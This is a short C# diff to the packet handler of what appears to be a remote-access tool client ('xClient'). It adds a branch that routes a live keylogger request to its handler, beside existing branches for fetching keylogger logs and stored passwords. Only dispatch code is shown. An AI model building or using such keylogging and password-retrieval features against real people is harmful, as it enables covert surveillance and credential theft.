@@ -176,6 +176,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
             }
+            else if (type == typeof(ServerPackets.GetKeyloggerLive))
+            {
+                CommandHandler.HandleGetKeyloggerLiveResponse((ServerPackets.GetKeyloggerLive)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetPasswords))
             {
                 CommandHandler.HandleGetPasswords((ServerPackets.GetPasswords)packet, client);
